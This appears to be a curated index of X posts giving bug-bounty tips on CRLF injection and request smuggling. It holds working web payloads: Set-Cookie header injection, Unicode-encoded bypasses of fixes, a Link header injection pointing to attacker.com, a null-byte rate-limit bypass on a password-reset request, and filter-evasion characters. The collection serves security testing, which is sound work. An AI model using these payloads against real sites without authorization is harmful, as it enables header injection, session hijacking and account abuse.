# X 语料 · 请求走私（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[请求走私](../by-type/request-smuggling.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-smuggling（6 条） · 本文 34 行

- TIP: If you don't like small scopes, explore also `out-of-scope` subdomains ... you could find juicy endpoints containing CRLF/XSSI issues, that can be used to achieve a concrete impact also on the main domain
- CRLF bypass %E5%98%8A ==> U+560A ===> 0A
- Bug Bounty Techniques
  Carriage Return Line Feed (CRLF) Injection Attack:
  GET /%0d%0aSet-Cookie:CRLFInjection=NetClinch HTTP/1.1
- Payload Https response splitting (CRLF) bypass >> (%E5%98%8A%E5%98%8D) usually it works on websites that use java in the backend.
- CRLF Injection, the payload is below
  &identifier=victim@gmail.com%0a%0dlink:https://attacker.com
- If your CRLF injection report is resolved (%0D%0ASet-Cookie:crlf=crlf), try to bypass it with /%E5%98%8D%E5%98%8ASet-Cookie:crlf=crlf
- Test CRLF with HTTPX with a one-liner.
  $ httpx -l <input-targets> -path ~/lists/<small-CRLF-payloads> -srd crlf-target
  Then grep through the output in ./clrf-target for your payloads! Like:
  grep -iEHr "^set-cookie: <your payload value>"
- Title:- CVE-2019-6802 CRLF Injection
  Severity: medium
  POC:- {{host}}/%0d%0aSet-Cookie:crlfinjection=1
- Bypass 429 (Too Many Requests)
  Adding Null Byte ( %00 ) or CRLF ( %09, %0d, %0a ) at the end of the Email can bypass rate limit.
  Request
  POST /ForgotPass.php HTTP/1.1
  Host: http://target.com
  ...
  email=victim@gmail.com%00
- Useful filter evasion characters:
  %0a%0d => CRLF
  %00 => Nullbyte
  %E2%80%AE => RTL Character (writes payloads backwards)
